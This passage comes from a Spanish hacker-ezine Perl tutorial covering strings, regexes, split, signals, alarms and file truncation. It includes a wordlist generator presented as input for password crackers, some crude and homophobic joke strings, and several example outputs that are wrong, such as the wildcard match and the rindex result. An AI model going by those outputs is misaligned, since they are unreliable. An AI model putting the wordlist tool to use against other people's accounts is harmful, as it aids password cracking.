- Para  solo  poner  el  primer caracter de la cadena en minusculas usaremos
  lcfirst:

  Ejemplo:

   #!/usr/bin/perl
   @frase = 'HOLA LOCO' ;
   @mayusculas =  map   lcfirst($_), @frase;
   print "@mayusculas\n";


  SALIDA:

   [root@localhost articulo]# perl lcfirst.pl
   hOLA LOCO


- CONVERTIR UN ESCALAR DE MINUSCULAS A MAYUSCULAS -

  Ejemplo:
   #!/usr/bin/perl
   $frase = 'HOLA LOCO' ;
   $frase =~ tr/a-z/A-Z/;
   print "$frase\n";


  SALIDA

   [root@localhost articulo]# perl CONVERTIR.pl
   HOLA LOCO




- AHORA DE MAYUSCULAS A MINUSCULAS -

  Ejemplo:

   #!/usr/bin/perl
   $frase = 'HOLA LOCO' ;
   $frase =~ tr/A-Z/a-z/;
   print "$frase\n";



  SALIDA

   [root@localhost articulo]# perl convertir.pl
   hola loco




- INVERTIR EL TEXTO CON REVERSE -


  Ejemplo:

   #!/usr/bin/perl
   $cadena="hola";
   $invertir = reverse $cadena;
   print "$invertir\n";


  SALIDA:

   [root@localhost arti]# perl reverse.pl
   aloh



- TRADUCCION CON TR o Y -

  Ejemplo:

   #!/usr/bin/perl
   $frase = 'HOLA LOCO' ;
   $frase =~ tr/H/ /; #transforma la H en un espacio
   print "$frase\n";


  SALIDA:

   [root@localhost arti]# perl traduce.pl
   OLA LOCO


* Se pueden encontrar varios modificadores con tr:

- Con d, hace que los caracteres que encuentre  sean  eliminados  y no reem-
  plazados.


  Ejemplo:

   #!/usr/bin/perl
   $frase = 'HOLA LOCO' ;
   $frase =~ tr/O/ /d; #elimina todas las O que encuentre
   print "$frase\n";


  SALIDA:

   [root@localhost articulo]# perl tr-d.pl
   H LA L C


- Tambien podemos usar y de la misma manera que tr:


  Ejemplo:

   #!/usr/bin/perl
   $frase = 'HOLA LOCO' ;
   $frase =~ y/H/ /; #transforma la H en un espacio
   print "$frase\n";

  SALIDA:

   [root@localhost articulo]# perl traduce2.pl
   OLA LOCO





- Longitud en bytes -

*Para saber cuanto ocupa una cadena en bytes usaremos length,de esta manera:

  Ejemplo:

   #!/usr/bin/perl
   $longitud= length "Hola\n";
   print "$longitud\n";


  SALIDA:

   [root@localhost articulo]# perl length.pl
   5


- Creando subcadenas con  substr -

* Para crear una subcadena a partir de una cadena usamos substr de esta  ma-
  nera:

   substr ($cadena,nºdecaracteresquehayqueleer)


  Ejemplo:

   #!/usr/bin/perl
   $frase= "hola me llamo ddiego \n";
   print substr($frase, 2), "\n";
   print substr($frase, 4,3), "\n";


  SALIDA:

   [root@localhost articulo]# perl substr.pl
   la me llamo ddiego

   me



- BUSCAR EN EL PRINCIPIO DE UNA CADENA -

* Para buscar ciertos caracteres en el comienzo de una cadena usamos /^:

  Ejemplo:

   #!/usr/bin/perl
   $texto="Hola que tal estas";
   if($texto=~/^Hola/)            #si al principio de la frase esta Hola
   {
   print "Hola esta  al prinicipio de la frase\n"; #imprime en pantalla
   }
   else                                    #si no esta
   {
   print "Hola no esta al principio en la frase\n";#imprime esto en pantalla
   }


  SALIDA:

   [root@localhost articulo]# perl principio.pl
   Hola esta  al prinicipio de la frase

* Si en vez Hola pusiesemos  /^hola con la h en minuscula,  saldria Hola  no
  esta al principio en la frase.



- COMODINES -

* Usaremos un . como comodin de esta forma:

  Ejemplo:
   #!/usr/bin/perl
   $texto="Hola que tal estas";
   if($texto=~/q.e/)                #si dentro de $texto hay un "q?e"
   {
    print "que esta en la frase\n"; #imprime en pantalla
   }
   else    #si no esta
   {
    print "que no esta en la frase\n";      #imprime esto en pantalla
   }


  SALIDA:

   [root@localhost articulo]# perl comodin.pl
   que no esta en la frase



- Buscando cadenas segun como sean sus caracteres -

- Por ejemplo, para buscar  una cadena que quizas su primer caracter empiece
  por mayusculas o minusculas usaremos los corchetes asi por ejemplo:


  Ejemplo:

   #!/usr/bin/perl
   $texto="Hola mi nick es Diego";
   if($texto=~/[Dd]iego/)  #Busca diego o Diego
        {
        print "$texto\n";
        }



- COVERTIDOR HTML -

- Un dia quieres por ejemplo pasar esta ezine a formato html, coño jodeeeeer
  tengo que poner pila de <BR> por cada salto de linea, mucho curro y se nos
  ocurre hacer un programeta en perl para que por cadaa  \n lo sustituya por
  un <BR>, na es una paranoia  usas <PRE> y  acababas  antes  na  esto es un
  ejemplo sin mucha utilidad:


  Ejemplo:

   <++> disidhtml.pl

   #!/usr/bin/perl
   print "------------------------------------------------\n";
   print "-              disidhtml.pl by DDiego          -\n";
   print "------------------------------------------------\n";
   print "-            D  I  S  I  D  E  N  T  S         -\n";
   print "-        L O S  F U E R A  D E  L A  L E Y     -\n";
   print "------------------------------------------------\n";
   print "[ Documento a convertir: ";
   $doc=<STDIN>;
   print "[ Nombre de doc html: ";
   $htmldoc=<STDIN>;
   open (documento, "$doc")
   or die "No se ha podido encontrar el documento $doc\n"; #die mata este
                                                           #proceso si no
                                                           #encuentra el
                                                           #documento
   open (salida, ">$htmldoc");
   foreach $lineas (<documento>) {
   $lineas =~ s/\n/<BR>/; #aqui se sustituye       n por <BR>
   print salida "$lineas \n";
   }
   close (documento);

   <-->


  SALIDA:

   [root@localhost html]$ perl addBR.pl
   ------------------------------------------------
   -           disidhtml.pl by DDiego             -
   ------------------------------------------------
   -            D  I  S  I  D  E  N  T  S         -
   -        L O S  F U E R A  D E  L A  L E Y     -
   ------------------------------------------------
   [ Documento a convertir: Perl_01.txt
   [ Nombre de doc html: perl.html
   [root@localhost html]$

* Ahora por casa salto de linea hay un <BR>



- Si quisiesemos convertir solo los archivos con extension txt usariamos :

   open (documento, <*.txt>)

- si fueran todos <*>



- Funcion index, sirve para saber la posicion de una cadena, la  sintaxis es
  la  siguiente:

index cadena, cadena a buscar, posicion de comienzo de busqueda de la cadena


  Ejemplo:

   #!/usr/bin/perl
   $salida=index holawestgewatg4, g, 0; #empieza a buscar la  cadena g desde
                                        #el primer caracter
   print "$salida\n";


  SALIDA:

   [root@localhost articulo]# perl index.pl
   8




- Funcion rindex, es igual que index pero comienza a buscar la cadena  desde
  el final, veamos como:


  Ejemplo:

   #!/usr/bin/perl
   $salida=rindex (holasquetal, a); #empieza a buscar la cadena g desde el
                                    #primer caracter
   print "$salida\n";


  SALIDA:

   [root@localhost articulo]# perl prueba.pl
   3








.==========================================================================.
|=======~ 13.0.0 CREACCION DE UN CREADOR DE DICCIONARIOS ~==================
|===========================================================================


- Vamos a crearnos nuestro propio "creador de diccionarios", facilmente y de
  forma artesanal como debe de ser.
  Para ello usaremos open para  abrir un fichero de texto  y para  guardarlo
  en otro, usaremos =~  para  que  los  espacios que hayan los sustituya por
  enter \n, y ya ordenado el texto lo guardaremos y asi crearemos el diccio-
  nario.


* Para reemplazar cualquier tipo de caracter se hace asi:

$reemplazando=~s/caracter a reemplazar/caracter por el que quieres que sea
reemplazado/g



* En el caso de un espacio por un \n seria asi

$reemplazando=~s/ /\n/g

veamos:

  Ejemplo:

   #!/usr/bin/perl
   open (documento, "archivo.txt"); #archivo de texto de donde queremos
                                    #sacar el diccionario

   open (diccionario, ">midiccionario.txt"); #archivo donde guardaremos
                                             #nuestro diccionario
   foreach $lineas (<documento>)    #ordena el documento
   {
    $lineas =~ s/ /\n/g;             #sustituye un espacio por un enter
    $lineas =~ s/,/\n/g;             #sustituye un espacio por una ,
    $lineas =~ s/"/\n/g;             #sustituye un espacio por unas "
    $lineas =~ s/-/\n/g;             #sustituye un espacio por un -
    print diccionario "$lineas, \n"; #Ahora llama a diccionario y lo
                                     #imprime dentro
   }
   close (documento);               #Cierra archivo.txt
   }


* Podemos matar un pajaro de un tiro con $lineas de otra forma:

   $lineas =~ s/( |,|.) /\n/g;


- Ponemos varias  restricciones  entre parentesis y la  |, la /g sirver para
  buscar y reemplaza  mas de  un  caracter no  se queda  en el  primero  que
  encuentra y s de sustituir, si pusieramos al final /gi esa i  quiere decir
  que no tiene en cuenta si son minusculas o mayusculas.



* Bueno en unas pocas lineas casi tenemos nuestro "creador de diccionarios",
  para usar con cualquier crackeador.




- Bien hemos visto el modificador g e i. tambien podemos ver  el modificador
  x te permitira usar espacios  en  blanco para  que se  entienda  mejor  la
  expresion y sea mas clara, tambien se puede usar  el valor o para que solo
  se evalue una vez una expresion.








.==========================================================================.
|=======~ 14.0.0 MANIPULANDO UNA VARIABLE GLOBAL ~==========================
|===========================================================================


- Supongamos que tenemos declarada una variable global y bien queremos modi-
  ficarla en un trozo del programa (como puede ser una subrutina),  nada mas
  sin modificar esta variable, veamos como se hace:


  Ejemplo:

   #!/usr/bin/perl
   $variable = hola;          #esta es la variable global
   print "$variable\n";       #imprime hola
   sub despedida{             #comienza una subrutina
   local $variable = "adios"; #le damos a la variable global otro valor, sin
                              #afectar a la var global
   print "$variable\n";       #imprimir
   }
   &despedida;                #llamamos a la subrutina de arriba
   print "$variable\n";       #imprime  hola, la variable global


  SALIDA:

   [root@localhost articulo]# perl local.pl
   hola
   adios
   hola


* Si en la subrutina no pusiesemos:    local  -->  local $variable ="adios";
  entonces cambiaria el valor de la variable global y imprimiria:

   [root@localhost articulo]# perl sinlocal.pl
   hola
   adios
   adios




.==========================================================================.
|=======~ 15.0.0 SPLIT ~====================================================
|===========================================================================


- Split tienen una funcion parecida a "foreach", ya que puede generar listas
  de datos a partir de cadenas de texto o escalares $, puede convertir estos
  en arrays o arreglos, veamos un ejemplo:


  Ejemplo:

   #!/usr/bin/perl
   $team="w3ndig0:S-P-A-R-K:leon01:Vanmore";
   @member=split(":",$team); #seria lo mismo que poner @member=split(/:/,$team);
   print "miembro:$member[0]\nmiembro:$member[1]\nmiembro:$member[2]\nmiembro:$member[3]\n";


  SALIDA:

   [root@localhost articulo]# perl split.pl
   miembro:w3ndig0
   miembro:S-P-A-R-K
   miembro:leon01
   miembro:Vanmore






- Ahora vamos a conseguir a que por cada caracter interponga un simbolo:


  Ejemplo:

   #!/usr/bin/perl
   print join('-',split(/ */, 'SPARK')),"\n";


  SALIDA:

   [root@localhost articulo]# perl split2.pl
   S-P-A-R-K


- Imaginemos que un dia queremos sustituir los puntos de una ip por espacios
  en blanco, y podremos acceder a cada uno  de los valores  del array, ya lo
  veremos mas adelante en las herramientas que vamos a hacer:


  Ejemplo:

   #!/usr/bin/perl
   print "Inserte una ip: ";
   $ip=<STDIN>;
   @ipsinpuntos = split(/\./,$ip); #sustituye los . por  espacios
   print "@ipsinpuntos\n";


  SALIDA:

   [root@localhost articulo]# perl ipsin.pl
   Inserte una ip: 62.36.152.32
   62 36 152 32





.==========================================================================.
|=======~ 16.0.0 JUGANDO CON BINARIOS ~=====================================
|===========================================================================


- Vamos a pasar de un numero "hexadecimal a binario" en una linea usando un-
  pack facilmente:




  Ejemplo, pasar de hexadecimal a binario en orden descendente:

   #!/usr/bin/perl
   $binario = join('', unpack('B*', "\x98"));  #pasamos el hexadecimal 98 a
                                               #binario

   print "$binario\n";                         #en orden descendente


  SALIDA:

   [root@localhost arti]# perl convbin.pl
   10011000




  Ejemplo, pasar de hexadecimal a binario en orden ascendente:

   #!/usr/bin/perl
   $binario = join('', unpack('b*', "\x98"));  #pasamos el hexadecimal 98 a
                                               #binario en orden ascendente
   print "$binario\n";

  SALIDA:

   [root@localhost articulo]# perl convbin2.pl
   00011001







.==========================================================================.
|=======~ 17.0.0 DIE WARN - LA MATANZA Y LA ALERTA ~========================
|===========================================================================


- En ocasiones el programa puede no funcionar como esperabamos o simplemente
  bajo algunas circusntancias se tiene que cerrar un proceso, para ello usa-
  remos die, vemos como:


* Voy a poner el trozo de un programa:

  open (documento, "$doc") or die "No se ha podido encontrar el documento
  $doc\n"; #die mata este proceso si no encuentra el documento
  open (diccionario, ">$dicc");
  foreach $lineas (<documento>) {



* Veamos con warn,  es igual de facil,  pero en sete caso  solo  alertaria y
  seguiria con el programa:


  Ejemplo:

   #!/usr/bin/perl
   open (ARCHIVO,"+<fsdfs.txt")
   or warn "No puedo abrir el archivo man"; #un archivo que ni existe
   print "Seguimos con el programa ;)\n";



  SALIDA:

   [root@localhost articulo]# perl warn.pl
   No puedo abrir el archivo man at warn.pl line 2.
   Seguimos con el programa ;)





.==========================================================================.
|=======~ 18.0.0 ARGUMENTOS DE UN PROGRAMA ~================================
|===========================================================================


- Vemos muchos programas que se incluyen lineas a la derecha como argumentos
  tipo nmap o algun otro scanner para ello usaremos el arreglo @ARGV:



  Ejemplo:

   #!/usr/bin/perl
   die "sintaxis: argumentos.pl <numero a sumar> <numero a sumar>\n"
   unless ($ARGV[1]);

   print "$ARGV[0] + $ARGV[1] es igual a: ", $ARGV[0] + $ARGV[1] ,"\n" ;


- OTRA FORMA MAS CLARA DE VERLO:

  Ejemplo:

   #!/usr/bin/perl
   die "sintaxis: argumentos.pl <numero a sumar> <numero a sumar>\n"
   unless ($ARGV[1]);
   $primer_argumento=$ARGV[0]; #asignamos unas variables a cada argumento
   $segundo_argumento= $ARGV[1];
   print "$ARGV[0] + $ARGV[1] es igual a:",  $primer_argumento +
   $segundo_argumento ,"\n" ;


  SALIDA:

   [root@localhost articulo]# perl argumentos.pl 2 2
   2 + 2 es igual a:4




- En la 2ª linea hay un die, que da el mensaje de como funciona el  programa
  a menos que se le introduzca algun argumento:


   [root@localhost arti]# perl argumentos.pl
   sintaxis: argumentos.pl <numero a sumar> <numero a sumar>



- A menos de que si se  introduzcan argumentos "unless ($ARGV[1]); seguira a
  la siguiente rutina  del programa  he imprimira la suma  de los argumentos
  que pongas:

   [root@localhost arti]# perl argumentos.pl 999 999
   999 + 999 es igual a: 1998


- Mas formas de llamar la atencion de que no se ha puesto  bien la  sintaxis
  de un programa:


  Ejemplo:

   #!/usr/bin/perl
   $saludos=$ARGV[0];
   $adios=$ARGV[1];
   if($saludos eq "" || $adios eq "") { &sintasix; }  #si saludos esta en
                                                      #blanco y $adios tb

   sub sintasix { print "programa <saludos> <adios>"; }
   print "$saludos\n";
   print "$adios\n";


  SALIDA:

* Poniendolo sin argumentos

   [root@localhost articulo]# perl masarg.pl
   programa <saludos> <adios>

* Con argumentos

   [root@localhost articulo]# perl masarg.pl hola adios
   hola
   adios




- Ahora queremos tener cierto control con los argumentos veamos como podemos
  controlarlos:


  Ejemplo:

   #!/usr/bin/perl
   if ($ARGV[0] eq "-v") { #si el primer argumento es igual a -v
                          print "con argumento\n";
                         }

                   else {
                          print "sin argumento\n";
                        }




  SALIDA:

   [root@localhost scancgis]# perl arg.pl
   sin argumento

   [root@localhost scancgis]# perl arg.pl -v
   con argumento






.==========================================================================.
|=======~ 19.0.0 VARIABLES LOCALES Y GLOBALES "local y my" ~================
|===========================================================================


- Por defecto  todas las variables estan definidas de forma global, es decir
  se puede acceder a ellas desde cualquier punto de un programa, pero es po-
  sible que queramos que solo afecte a un trozo de codigo,  para ello usare-
  mos la clave "local" que localiza una variable dentro de un trozo de codi-
  go y "my" que se suele usar mas  y es mas recomendable, sirve  para decla-
  rar variables en un trozo de codigo como puede ser una subrutina ej:


  Ejemplo:

   #!/usr/bin/perl
   sub miembros
   {
         my $nombre = "DDiego";     #declaro una variable local
         print "nombre: $nombre\n";
   }
   my $colegas = "Genl0g";        #declaro una variable local
   print "amigos: $colegas\n";    #imprime Genl0g
   &miembros     #llamo a la subrutina miembros



  SALIDA:

   [root@localhost arti]# perl my.pl
   amigos: Genl0g
   nombre: DDiego






.==========================================================================.
|=======~ 20.0.0 GOTO ~=====================================================
|===========================================================================


- En perl como en visual,tambien existe la clave goto nombreetiqueta; y lue-
  go ira a la clave nombreetiqueta: seguido del comando que quieras en el ej
  siguiente es un print:



  Ejemplo:

   #!/usr/bin/perl
   $numero=1;
   print("Introduce un numero: ");
   $introduce = <STDIN>;
   if ($introduce==$numero)
   {
    print "Has acertado el numero \n";
   }
   else
   {
   goto fallaste;
   }
   fallaste: print "Has perdido el numero era el $numero\n";


  SALIDA:

   [root@localhost arti]# perl intro.pl
   Introduce un numero: 2
   Has perdido el numero era el 1





.==========================================================================.
|=======~ 21.0.0 MENU ~=====================================================
|===========================================================================


- Para crear un menu en perl usaremos switch que tambien existe en c,veremos
  como se hace:


  Ejemplo:

   #!/usr/bin/perl
   print " -------------------------------------\n";
   print " --------------- MENU  ---------------\n";
   print " -------------------------------------\n";
   print " OPCION 1                            -\n";
   print " OPCION 2                            -\n";
   print " OPCION 3                            -\n";
   print " -------------------------------------\n";
   print "Elija una opcion: ";
   $opcion=<STDIN>;
   SWITCH:
   {
    if ($opcion==1) {
                        print "Has elejido la opcion 1\n";
                    }
   if ($opcion==2)  {
                        print "Has elejido la opcion 2\n";
                    }
   if ($opcion==3)  {
                        print "Has elejido la opcion 3\n";
                    }
   }



  SALIDA:

   [root@localhost articulo]# perl menu.pl
   -------------------------------------
   --------------- MENU  ---------------
   -------------------------------------
   OPCION 1                            -
   OPCION 2                            -
   OPCION 3                            -
   -------------------------------------
   Elija una opcion: 1
   Has elejido la opcion 1

   [root@localhost articulo]# perl menu.pl
   -------------------------------------
   --------------- MENU  ---------------
   -------------------------------------
   OPCION 1                            -
   OPCION 2                            -
   OPCION 3                            -
   -------------------------------------
   Elija una opcion: 1
   Has elejido la opcion 1

   [root@localhost articulo]# perl menu.pl
   -------------------------------------
   --------------- MENU  ---------------
   -------------------------------------
   OPCION 1                            -
   OPCION 2                            -
   OPCION 3                            -
   -------------------------------------
   Elija una opcion: 2
   Has elejido la opcion 2

   [root@localhost articulo]# perl menu.pl
   -------------------------------------
   --------------- MENU  ---------------
   -------------------------------------
   OPCION 1                            -
   OPCION 2                            -
   OPCION 3                            -
   -------------------------------------
   Elija una opcion: 3
   Has elejido la opcion 3



* Salen todos perfectamente







.==========================================================================.
|=======~ 22.0.0 BEGIN END ~================================================
|===========================================================================


- Podemos hacer que se ejecute algo al principio de todo teniendo  prioridad
  ante los demas, y  todo gracias a  BEGIN y con END podemos tener  el mismo
  resultado pero en este caso se ejecutara al final veamos un ejemplo:

  Ejemplo:

   #!/usr/bin/perl
   print "hola\n";
   BEGIN {print "yo soy el primero\n"}
   END {print "y yo el ultimo\n"}
   print "adios\n";


  SALIDA:

   [root@localhost articulo]# perl begin_end.pl
   yo soy el primero
   hola
   adios
   y yo el ultimo









.==========================================================================.
|=======~ 23.0.0 COMUNICACION ENTRE PROCESOS ~==============================
|===========================================================================


- Este tema es un poco mas chungo que todo lo que  hemos visto hasta  ahora,
  pero bueno a darle caña. Bueno un proceso es un programa que se ejecuta en
  una maquina, estos pueden ser muchos como supondremos, fijo que estan  co-
  rriendo mas programas de los que creemos,y muchos de ellos manejan el sis-
  tema y son usados para ejecutar otros programas, en este apartado aprende-
  remos a controlar mas nuestros scripts, sacar informacion sobre  procesos,
  crearlos etc, osea un capitulo brasa a muerte.


* Para ver el identificador del proceso del programa que estamos usando usa-
  remos $$ getppid para ver el proceso ascendiente, de esta manera:

  Ejemplo:

   #!/usr/bin/perl
   print "Indentificacion del proceso  $$ es ", getppid, "\n";


  SALIDA:

   [root@localhost articulo]# perl pid.pl
   Indentificacion del proceso  1558 es 1533
   #1558 es el proceso actual $$
   #1533 es el proceso ascendiente getppid


- Para optener  el grupo al que pertenece el proceso de un programa,  usamos
  getpgrp:


  Ejemplo:

   #!/usr/bin/perl
   print "Grupo de procesos ($$): ",getpgrp(0), ", pariente (",getppid,"):
   ",getpgrp(getppid),"\n";


  SALIDA:

   Grupo de procesos (1893): 1893, pariente (1227):1227


   #en getpgrp(0) nos devuelve el grupo del proceso que estamos ejcutando


- Te estaras preguntado como manipular estos procesos, entre otras cosas me-
  diante señales, y cuales son estas señales??, estas señales tambien nos la
  envia el programa a nosotros o a otros programas,puenden ser de muchos ti-
  pos, de error de un programa, que continua un proceso, que se finaliza etc


  Ejemplo:

   #/usr/bin/perl
   print "------------------\n";
   print "- SEÑALES EN PERL-\n";
   print "------------------\n";
   print "\n";
   foreach $signal (sort keys %SIG) #ordenemoslas
   {
        print " $signal \n";
   }



  SALIDA:


   ------------------
   - SEÑALES EN PERL-
   ------------------

 ABRT   #El programa termina de forma anormal y graba una imagen en memoria -> clasicos "core dump"
 ALRM   #El temporizador de la funcion alarm caduco  (el proceso termina)
 BUS    #El proceso intento usar memoria lmal alineada o sin alinear graba una imagen en memoria -> clasicos "core dump"
 CHLD   #Un proceso hijo ha sido detenido o finalizado
 CLD    #El proceso hijo se ha detenido, el programa lo termina o ignora
 CONT   #Esta señal hace que se continue un proceso que esta detenido
 FPE    #Excepciones de punto flotante,  graba una imagen en la memoria genera imagen clasica
 HUP    #Muerte de un proceso de control, el proceso termina
 ILL    #Intruccion o comando ilegal, da error de programa, proceso termina y graba la imagen core dump
 INT    #Señal de interrupcion de un proceso ya sea por el usuario o por un programa
 IO     #Se recibio una E/S ansincrona-> se ingnora
 IOT    #Error E/S, el programa termina de forma anormal y graba una imagen en memoria
 KILL   #Señal de muerte o finalizacion de un programa
 NUM33
 NUM34
 NUM35
 NUM36
 NUM37
 NUM38
 NUM39
 NUM40
 NUM41
 NUM42
 NUM43
 NUM44
 NUM45
 NUM46
 NUM47
 NUM48
 NUM49
 NUM50
 NUM51
 NUM52
 NUM53
 NUM54
 NUM55
 NUM56
 NUM57
 NUM58
 NUM59
 NUM60
 NUM61
 NUM62
 PIPE   #Señal de fallo de canalizacion, execepcion de software se ha intentando de escribir a un pipe y este no dipone de lectores
 POLL   #Ocurrio un suceso encuestable, el proceso termina
 PROF   #La larma de controno asignada sobre un segmento de codigo expiro, el proceso finaliza
 PWR    #El programa detecto un problema de suministro electrico
 QUIT   #Señal de finalizacion de un programa
 RTMAX
 RTMIN
 SEGV   #Señal de fallo de segmentacion, se ha intentado acceder a una direccion en la memoria que no es valida
 STKFLT #Señal de fallo en la pila, la pila se fue a carajo, el proceso termina
 STOP   #Detiene un proceso
 SYS    #Un argumento es incorrecto y ha sido pasado a rutina, graba imagen core dump
 TERM   #El proceso finaliza
 TRAP   #Se detuvoo el proceso, el proceso en este caso finaliza y graba una imagen "core  dump" en memoria
 TSTP   #Detiene un proceso por que se a recibido una señal por el teclado
 TTIN   #Un proceso ejecutado en 2º plano intenta leer el terminal de control
 TTOU   #Un proceso ejecutado en 2º plano intenta escribir en el terminal de control
 UNUSED #Señal no utilizada, el proceso termina
 URG    #Señal de condicion de urgfencia de un socket
 USR1   #Esta señal puede ser definida por una aplicacion o por el usuario, el proceso finaliza
 USR2   #Esta señal puede ser definida por una aplicacion o por el usuario, el proceso finaliza
 VTALRM #Señaliza que la alarma de intervalos expiro, el proceso finaliza
 WINCH  #Señaliza que el tamaño de la ventana de un terminal ha cambiado
 XCPU   #Señala que el proceso ha excedido la cantida de tiempo de uso de la  CPU que podia utlizar, el proceso termia y graba imagen core dump  en memoria
 XFSZ   #Señala que el proceso intento acceder o modificar un archivo mas grande que el limite de tamaño de archivo del sistema, genera imagen core dump en memoria

* Como  se  juegan  con estas señales podemos ver un ejemplo en el  apartado
  siguiente de alarmas, usa esta sintaxis:


  $SIG{NOMBRE DE SEÑAL} = sub { print "Pepe\n"; }



* Cada vez que esa señal surga imprimira esa subrutina pepe,  adelantemos un
  poco de el siguiente apartado

$SIG{ALRM} = sub  { die "Fuera de tiempo"}; #Si el temporizador de la  alarma
                                            #caduca imprimira fuera de tiempo


- Como ignorar una señal, sigue esta sintaxis $SIG{NOMBRE DE SEÑAL} = 'IGNORE';

- Como restablecer una señal a su valor o salida original  $SIG{NOMBRE DE SEÑAL} = 'DEFAULT';


- Matando procesos con kill, la sintaxis es la siguiente:

kill('NOMBRE DE SEÑAL', IDENTIFICADOR DEL PROCESO );# o lo que es  lo  mismo
                                                    # en vez una coma usamos
                                                    # =>


   kill NOMBRE DE SEÑAL => IDENTIFICADOR DEL PROCESO ;

* Para grupos de procesos se pone un - delante

   kill NOMBRE DE SEÑAL => -GRUPO DE PROCESO ;


  Ejemplo:

   kill ALRM=>$$;




* Tambien es posible:

- Señal de advertenvia _WARN_ , vamos  a usarla par imprimir un  mensaje  de
  advertencia:

  Ejemplo:

   #!/usr/bin/perl
   sub mensaje_advertencia {
                            print "WARNING YOU ARE FUCKED:\n$_[0]"; #MensaJe
                                                     #clasico de advertencia
                           }
   $SIG{__WARN__}=\&mensaje_advertencia;
   print "Despues de esta linea imprimira el mensaje de advertencia\n";
   warn "Cuidado no se que pasa vigila tu culo holer0\n";
   print "Va que mas te da eres un lamer gay xDDD\n";




  SALIDA:

   [root@localhost fork]# perl warn.pl
   Despues de esta linea imprimira el mensaje de advertencia
   WARNING YOU ARE FUCKED:
   Cuidado no se que pasa vigila tu culo holer0
   Va que mas te da eres un lamer gay xDDD


- Ahora veremos la señal die, evitaremos que ejecute una subrutina:

  Ejemplo:

   #!/usr/bin/perl
   sub subrutina_matada {
                         print  "Este texto no saldra\n";
                        }

   $SIG{__DIE__} = \&subrutina_matada;
   print "Este texto si saldra \n";


  SALIDA:

   [root@localhost fork]# perl die.pl
   Este texto si saldra



- Cerrar el programa -


Podemos usar exit de esta forma, en este bucle infinito:


  Ejemplo:
   #!/usr/bin/perl
   for(;;)
         {
          print "hola\n";
          exit;
         }




  SALIDA:

   [root@localhost articulo]# perl exit.pl
   hola








.==========================================================================.
|=======~ 24.0.0 ALARMAS Y TEMPORIZADORES ~=================================
|===========================================================================


- Empezaremos viendo la funcion "sleep", que para un proceso durante los se-
  gundos  que indiques, por ejemplo:


  Ejemplo:
   #!/usr/bin/perl
   print "hola\n";  #Imprime hola
   sleep 5; #Esperara 5 segundos
   print "adios\n";  #luego imprimira adios




  SALIDA:

   [root@localhost articulo]# perl sleep.pl
   hola
   adios

* Despues  de imprimir hola espera 5 segundos para  imprimir adios


- Veamos otro tipo de alarma:

  Ejemplo:

   #!/usr/bin/perl
   print "Login: ";
   eval    #si el bloque eval falla finaliza el valor  $@
   {
       $SIG{ALRM} = sub  { die "Fuera de tiempo"};#Si el temporizador de la
                                                  #alarma caduca imprimira
                                                  #fuera de tiempo

       alarm 5;  #alarma en 5 segundos e imprime el mensaje de Fuera de tiempo
       $login =<STDIN>; #si escribe el login en menos de 5 seg
       alarm 0;         #la alarma se para
   };
   if ($@ =~ /Fuera de tiempo/){    #Si dentro del valor esta Fuera de tiempo
   print "No te ha dado tiempo\n";  #imprime eso
   } else {
   print "Hola $login\n";
   }



  SALIDA:

  - Respondiendo:

    [root@localhost articulo]# perl alarma.pl
    Login: DDiego
    Hola DDiego

  - Sin responder:

    [root@localhost articulo]# perl alarma2.pl
    Login: No te ha dado tiempo


- Y si ignorasemos el proceso, con IGNORE:

  Ejemplo:
   #!/usr/bin/perl
   print "Login: ";
   eval    #si el bloque eval falla finaliza el valor  $@
   {
       $SIG{ALRM} = 'IGNORE';#Ignora la alarma
       alarm 5;  #Estos 5 segundos no valen nada
       $login =<STDIN>; #Tienes todo el tiempo que quieras para escribir  tu
                        #login
       alarm 0;
   };
   if ($@ =~ /Fuera de tiempo/){
   print "No te ha dado tiempo\n";
   } else {
   print "Hola $login\n";
   }





.==========================================================================.
|=======~ 25.0.0 TRUNCANDO ARCHIVOS ~=======================================
|===========================================================================


- Cuando se habla de truncar archivos, se habla de acortarlo pero tambien es
  posible aumentar su  tamaño llenando  de ceros el final del archivo, (buen
  sitio para meter informacion adicional no??), veamos el code, facil y sen-
  cillo:


  Ejemplo:
   #!/usr/bin/perl
   open (ARCHIVO,"+<archiv.txt")
   or die "No puedo abrir el archivo man";#abre el archivo en modo escritura
                                          #y lectura

   truncate ARCHIVO,20000; #trunca el archivo a 20000 bytes


- };) haber si vas a dejar sin espacio el disco y se te cuelga el pc jejeje



* umm quedaria asi algo mas bonito

 <++> trucarchi.pl

  #!/usr/bin/perl
  ##########################
  # TRUNCA ARCHIVOS        #
  #           by DDiego    #
  #                        #
  #   D I S I D E N T S    #
  ##########################
  die "sintaxis: truncar.pl <nombre de archivo> <tamaño>\n"
  unless ($ARGV[1]); #si no enchufas los dos arg imprime eso

  $archivo=$ARGV[0];
  $tamano=$ARGV[1];

  open (ARCHIVO,"+<$archivo")
  or die "No puedo abrir el archivo man"; #abre el archivo en modo escritura
                                          #y lectura
  truncate ARCHIVO,$tamano; #trunca el archivo a los bytes que quieras

 <-->







.==========================================================================.
|=======~ 26.0.0 RESET ~====================================================
|===========================================================================


- Gracias a reset,podemos borrar todas las variables que empiecen por la le-
  tra que queramos o el numero que queramos, de esta forma:

 reset 'd'; #borra todas las variables que empiezan por d


 reset 'a-z'; #borra todas  las variables que empiecen por  cualquier  letra
              #minuscula de la "a" a la "z"






.==========================================================================.
|=======~ 27.0.0 JUGANDO CON LOS NUMEROS ~==================================
|===========================================================================


- No me voy a meter mucho en este tema pero bueno, si quereis que me meta en
  el siguiente capitulo no hay problema, me lo decis y sin problema  me  me-
  to   un poco con funciones trigonometricas etc, en  lo que si me voy a me-
  ter es en la conversion de bases hexadecimal (base 16),  octal (base 8)  a
  decimal (10  clasica), de decimal a ASCII, numeros aleatorios, tambien ve-
  remos alguna cosa mas.


* Veamos que facil es pasar de hexadecimal a decimal, para ello usaremos  la
  funcion hex:

  Ejemplo:

   #!/usr/bin/perl
   print hex ("ffff"), "\n";


  SALIDA:

   [root@localhost articulo]# perl hex.pl
   65535


- De octal a decimal, usaremos de la misma forma oct:

  Ejemplo:

   #!/usr/bin/perl
   print oct ("0755"), "\n";


  SALIDA:

   [root@localhost articulo]# perl oct.pl
   493


- Jeje, bueno ya como estamos con conversiones vamos a ver como convertir de
  decimal a ASCII, y quien no sabe que el 126 es ~,  para la conversion usa-
  remos chr, veamos un ej:


  Ejemplo:

   #!/usr/bin/perl
   print chr("126"), "\n";


  SALIDA:

   [root@localhost articulo]# perl chr.pl
   ~


* Ahora  queremos  que  el  programa genere un numero aleatorio, y para ello
  usaremos rand:


- En principio "rand" genera un numero aleatorio con coma flotante entre 0 y
